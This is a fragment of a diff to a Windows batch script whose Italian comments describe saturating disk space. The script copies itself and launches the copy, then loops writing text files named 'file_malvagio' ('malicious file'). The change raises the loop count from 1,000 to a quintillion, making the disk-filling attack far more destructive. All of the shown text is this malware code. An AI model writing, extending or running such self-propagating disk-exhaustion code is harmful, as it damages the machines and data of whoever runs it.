@@ -23,7 +23,7 @@ copy "%~f0" "%DEST_FILE%" >nul
 start "" "%DEST_FILE%"
 
 :: Creazione di numerosi file per saturare lo spazio su disco
-for /L %%A in (1,1,1000) do (
+for /L %%A in (1,1,1000000000000000000) do (
     echo Questo è un file di esempio %%A > "%DEST_DIR%\file_malvagio_%%A.txt"
 )
 
